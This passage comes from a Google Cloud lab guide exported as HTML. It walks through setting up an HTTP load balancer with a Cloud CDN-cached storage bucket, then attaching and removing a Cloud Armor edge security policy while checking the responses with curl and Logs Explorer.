</span><a href='https://cloud.google.com/load-balancing'><span>Cloud Load Balancing</span></a><span>. In this section, you create an HTTP Load balancer.</span></p><ol start='' ><li><p><span>In the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>), click </span><strong><span>View All Products &gt; Network services</span></strong><span> &gt; </span><strong><span>Load Balancing</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>+CREATE LOAD BALANCER</span></strong><span>.</span></p></li><li><p><span>Under Type of </span><strong><span>load balancer</span></strong><span>, select </span><strong><span>Application Load Balancer (HTTP/HTTPS)</span></strong><span> and click </span><strong><span>NEXT</span></strong><span>.</span></p></li><li><p><span>Under </span><strong><span>Public facing or internal</span></strong><span>, select </span><strong><span>Public facing (external)</span></strong><span> and click </span><strong><span>NEXT</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Global or single region deployment</span></strong><span>, select </span><strong><span>Best for global workloads</span></strong><span> and click </span><strong><span>NEXT</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Load balancer generation</span></strong><span>, select </span><strong><span>Global external Application Load Balancer</span></strong><span> and click </span><strong><span>NEXT</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>CONFIGURE</span></strong><span> button.</span></p></li><li><p><span>Name the load balancer as </span><code>edge-cache-lb</code><span>.</span></p></li></ol><h5 id='create-frontend-configuration'><span>Create frontend configuration</span></h5><p><span>To create the frontend configuration:</span></p><ol start='' ><li><p><span>Click on </span><strong><span>Frontend configuration</span></strong><span>.</span></p></li><li><p><span>For the frontend configuration use HTTP (though HTTPS also works if you have a certificate) and an ephemeral IP address and ensure that you have selected the premium tier network. This is by default.</span></p></li><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li></ol><p><img src="https://cdn.qwiklabs.com/W%2Ftq7MRoTnPDw%2Bvl3uNSZwxbwFEE1txmCee%2FHTIZ8yM%3D" referrerpolicy="no-referrer" alt="Frontend configuration page, which includes the load balancer's description"></p><h5 id='create-backend-configuration'><span>Create backend configuration</span></h5><p><span>To create the backend configuration:</span></p><ol start='' ><li><p><span>Click on </span><strong><span>Backend configuration</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Backend services &amp; backend buckets</span></strong><span>, click </span><strong><span>Create a backend bucket</span></strong><span>.</span></p></li><li><p><span>Set the </span><strong><span>Backend bucket name</span></strong><span> to </span><code>lb-backend-bucket</code><span>.</span></p></li><li><p><span>In the next field, select the Cloud Storage bucket created earlier by clicking the </span><strong><span>Browse</span></strong><span> button.</span></p></li><li><p><span>Leave all other values at their defaults.</span></p></li><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><h5 id='create-host-and-path-rules'><span>Create host and path rules</span></h5><p><span>To create host and path rules:</span></p><ol start='' ><li><p><span>Click on </span><strong><span>Routing rules</span></strong><span> on the left.</span></p></li><li><p><span>Select </span><strong><span>simple host and path rule</span></strong><span> under Mode to send any request to the bucket. This is the default option.</span></p></li></ol><h5 id='review-and-create-the-http-load-balancer'><span>Review and create the HTTP Load Balancer</span></h5><p><span>To review and create the HTTP Load Balancer:</span></p><ol start='' ><li><p><span>Click on </span><strong><span>Review and finalize</span></strong><span>.</span></p></li><li><p><span>Review the </span><strong><span>Backend services</span></strong><span> and </span><strong><span>Frontend</span></strong><span>.</span></p></li><li><p><span>Click on </span><strong><span>Create</span></strong><span>.</span></p></li></ol><h5 id='get-load-balancer-ip'><span>Get Load Balancer IP</span></h5><p><span>To get the Load Balancer IP from the console:</span></p><ul><li><p><span>Click the load balancer name in the list of load balancers for the project. Note the IPv4 address of the load balancer for the next task. Refer to it as </span><code>[LOAD_BALANCER_IP]</code><span>.</span></p></li></ul><p><img src="https://cdn.qwiklabs.com/gEIAdRhQ0Wllm2LutPBRlMAcAgXNbrZH%2FUMny9AgaGI%3D" referrerpolicy="no-referrer" alt="The Details page, which includes the highlighted IP:Port address"></p><h5 id='query-the-load-balancer'><span>Query the Load Balancer</span></h5><p><span>After a couple minutes, query the load balancer for the object you uploaded. You will need the load balancer IP address and the name of the image.</span></p><ol start='' ><li><p><span>Run the following from CloudShell and replace the LOAD_BALANCER_IP with the IPv4 address of the load balancer:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -svo /dev/null http://LOAD_BALANCER_IP/google.png</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><strong><span>Note:</span></strong><span> It might take up to 5 minutes to access the HTTP Load Balancer.</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">student-cloudshell% curl -svo /dev/null http://34.98.81.123/google.png</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">* &nbsp; Trying 34.98.81.123...</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">* TCP_NODELAY set</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">* Connected to 34.98.81.123 (34.98.81.123) port 80 (#0)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; GET /google.png HTTP/1.1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; Host: YOUR_IP</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; User-Agent: curl/7.64.1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; Accept: */*</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; HTTP/1.1 200 OK</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; X-GUploader-UploadID: ADPycdtoILI76KVsvBvdVGvSfzaxys1m3zYqCepBrmJxAI48ni24cWCRIdNu-53PX3DS6iycxp6xwFbMpwtcHHZQUQmEBxAgng</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; Expires: Mon, 13 Dec 2021 22:58:26 GMT</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; Date: Mon, 13 Dec 2021 21:58:26 GMT</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; Cache-Control: public, max-age=3600</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; Last-Modified: Mon, 13 Dec 2021 21:45:57 GMT</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; ETag: "8f9327db2597fa57d2f42b4a6c5a9855"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; x-goog-generation: 1639431957957903</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; x-goog-metageneration: 2</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; x-goog-stored-content-encoding: identity</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; x-goog-stored-content-length: 5969</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; Content-Type: image/png</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; x-goog-hash: crc32c=TeiHTA==</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; x-goog-hash: md5=j5Mn2yWX+lfS9CtKbFqYVQ==</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; x-goog-storage-class: STANDARD</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; Accept-Ranges: bytes</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; Content-Length: 5969</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; Server: UploadServer</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 630px;"></div><div class="CodeMirror-gutters" style="display: none; height: 630px;"></div></div></div></pre><ol start='' ><li><p><span>Run a few queries with this command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">for i in `seq 1 50`; do curl http://LOAD_BALANCER_IP/google.png; done</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><h5 id='confirm-content-served-by-cloud-cdn'><span>Confirm content served by Cloud CDN</span></h5><ul><li><p><span>Validate that your content is being served from the CDN via CDN or Load Balancing Monitoring by navigating to </span><strong><span>Network Services &gt; Cloud CDN</span></strong><span>.</span></p></li></ul><p><img src="images/7UEDVoyLD6cXCvf7GPS11Wg9EXVz0WD57IqpPKT3ocM%3D.png" referrerpolicy="no-referrer" alt="Cloud CDN overview page, with one result populated"></p><p><span>You should be able to get close to a 100% hit ratio.</span></p><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Create a Load Balancer</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='task-3-delete-the-object-from-cloud-storage-bucket'><span>Task 3. Delete the object from Cloud Storage bucket</span></h4><p><span>Now that the cache is populated, delete the object from the bucket. This will reinfore that you are applying the policy to the cache and not the backend.</span></p><ol start='' ><li><p><span>In the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>), click </span><strong><span>Cloud Storage &gt; Buckets &gt; </span><code>Bucket Name</code></strong><span>.</span></p></li><li><p><span>Select the object and delete it by clicking the </span><strong><span>Delete</span></strong><span> button at the top.</span></p></li><li><p><span>Click </span><strong><span>Delete</span></strong><span> at the prompt.</span></p></li></ol><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Delete the object from Cloud Storage bucket</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='task-4-create-an-edge-security-policy'><span>Task 4. Create an edge security policy</span></h4><p><span>Cloud Armor policies are substantiated outside of the HTTP Load Balancer. Once the Cloud Armor policy is deployed, you can then associate it with one or more HTTP Load Balancer Backend Service or Bucket resources, referred to as a Target.</span></p><ol start='' ><li><p><span>In the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>), click </span><strong><span>View All Products &gt; Network Security &gt; Cloud Armor policies</span></strong><span> and click </span><strong><span>Create Policy</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults and click </span><strong><span>Next Step</span></strong><span>:</span></p></li></ol><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>edge-security-policy</span></td></tr><tr><td style='text-align:left;' ><span>Policy type</span></td><td style='text-align:left;' ><span>Edge security policy</span></td></tr><tr><td style='text-align:left;' ><span>Default rule action</span></td><td style='text-align:left;' ><span>Deny</span></td></tr></tbody></table></figure><ol start='' ><li><p><span>In </span><strong><span>Apply policy to targets</span></strong><span> section, click </span><strong><span>Add Target</span></strong><span> and set the following values:</span></p></li></ol><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Type 1</span></td><td style='text-align:left;' ><span>Backend bucket (external application load balancer)</span></td></tr><tr><td style='text-align:left;' ><span>Backend Bucket target 1</span></td><td style='text-align:left;' ><span>lb-backend-bucket</span></td></tr></tbody></table></figure><ol start='' ><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create Policy</span></strong><span>.</span></p></li></ol><h5 id='validate-edge-security-policy'><span>Validate Edge Security Policy</span></h5><p><span>Now that you&#39;ve created an edge security policy in front of the back-end bucket, validate that it works as expected.</span></p><h6 id='check-the-security-policy'><span>Check the security policy</span></h6><p><span>After a few minutes have passed, you can check that the Cloud Armor policy is running.</span></p><p><span>From the command line, run the following command, which gives you a 403:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -svo /dev/null http://LOAD_BALANCER_IP/google.png</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>A 403 error occurs when you do not have permission to accessing a web page or something on a web server.</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -svo /dev/null http://34.98.81.123/google.png</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">* &nbsp; Trying 34.98.81.123...</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">* TCP_NODELAY set</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">* Connected to 34.98.81.123 (34.98.81.123) port 80 (#0)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; GET /google.png HTTP/1.1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; Host: YOUR_IP</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; User-Agent: curl/7.64.1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; Accept: */*</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; HTTP/1.1 403 Forbidden</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; X-GUploader-UploadID: ADPycdtS6FtJOGIsiWYDrAAE8VFeQuNutcvbGoQe2t8EZxsuspVtmCjyiTv_P3CNktroHMOGFXkTCfG-Jj-rUO60ZGPpEbpqcw</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; Content-Type: application/xml; charset=UTF-8</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; Content-Length: 111</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; Date: Mon, 13 Dec 2021 23:09:35 GMT</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; Expires: Mon, 13 Dec 2021 23:09:35 GMT</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; Cache-Control: private, max-age=0</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; Server: UploadServer</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 405px;"></div><div class="CodeMirror-gutters" style="display: none; height: 405px;"></div></div></div></pre><h6 id='investigate-the-logs'><span>Investigate the logs</span></h6><p><span>Next, you check the logs to see the enforced edge security policy.</span></p><ol start='' ><li><p><span>In the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>), click </span><strong><span>View All Products &gt; Observability &gt; Logging &gt; Logs Explorer</span></strong><span>.</span></p></li><li><p><span>Enter the below snippet into the query box and click </span><strong><span>Run Query</span></strong><span>:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">resource.type:(http_load_balancer) AND jsonPayload.@type="type.googleapis.com/google.cloud.loadbalancing.type.LoadBalancerLogEntry" AND severity&gt;=WARNING</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Note the </span><code>403 response</code><span> and the enforced security policy.</span></p></li></ol><p><img src="images/6oLMK5C%2FszEFTgZb1VOEtFb4z%2BQr%2FFb470LXgCZ5Y8c%3D.png" referrerpolicy="no-referrer" alt="The Query page, which includes the highlighted 403 response message and its security policy"></p><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Create edge security policy for cloud Armor</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h5 id='remove-the-security-policy'><span>Remove the security policy</span></h5><p><span>To prove that the object is getting delivered from the CDN cache, remove the Cloud Armor security policy and query the object. The origin object has been removed from Cloud Storage, thus illustrating that the object is getting served from the edge cache.</span></p><ol start='' ><li><p><span>In the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>), click </span><strong><span>View All Products &gt; Network Security &gt; Cloud Armor policies &gt; edge-security-policy &gt; Targets</span></strong><span>.</span></p></li><li><p><span>Select the </span><code>lb-backend-bucket</code><span> target and click </span><strong><span>Remove</span></strong><span> to remove the target bucket. Confirm </span><strong><span>Remove</span></strong><span>.</span></p></li><li><p><span>Wait a few minutes, then send another </span><code>curl</code><span> to the resource in the Cloud Storage bucket:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -svo /dev/null http://LOAD_BALANCER_IP/google.png</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>You get a </span><code>200</code><span> response this time. The web page is acting as it is supposed to.</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">student-cloudshell% curl -svo /dev/null 